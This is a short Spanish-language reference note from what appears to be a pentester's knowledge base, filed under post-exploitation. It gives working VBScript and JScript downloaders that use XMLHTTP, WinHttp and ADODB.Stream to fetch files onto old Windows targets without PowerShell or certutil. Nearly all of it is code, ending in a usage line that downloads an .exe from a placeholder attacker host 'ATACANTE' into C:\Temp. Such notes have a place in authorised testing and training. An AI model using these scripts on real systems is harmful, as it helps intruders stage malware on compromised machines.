---
tipo: meta
aliases:
  - wget.vbs
  - wget.js
tags:
  - meta/referencia
  - dominio/post-explotacion
---

# Descarga por cscript - wget.vbs y wget.js

> [!info] Payload, no un zettel
> Scripts para descargar un archivo por HTTP en Windows viejo sin PowerShell ni `certutil`. El criterio de cuándo elegir este canal vive en [[Transferencia de archivos - matriz de referencia]].

`cscript` es solo el intérprete: estos archivos no existen en Windows, hay que crearlos en el objetivo primero. Un objeto XMLHTTP baja la URL y `ADODB.Stream` escribe el binario a disco. Funciona desde Windows 98.

## VBScript — guardar como `wget.vbs`

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

## JScript — guardar como `wget.js`

Mismo efecto con `WinHttp.WinHttpRequest`:

```javascript
var r = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
r.Open("GET", WScript.Arguments(0), false); r.Send();
var s = new ActiveXObject("ADODB.Stream");
s.Type = 1; s.Open(); s.Write(r.ResponseBody);
s.SaveToFile(WScript.Arguments(1));
```

## Uso

```cmd
cscript //nologo wget.vbs http://ATACANTE/ARCHIVO.exe C:\Temp\ARCHIVO.exe
```
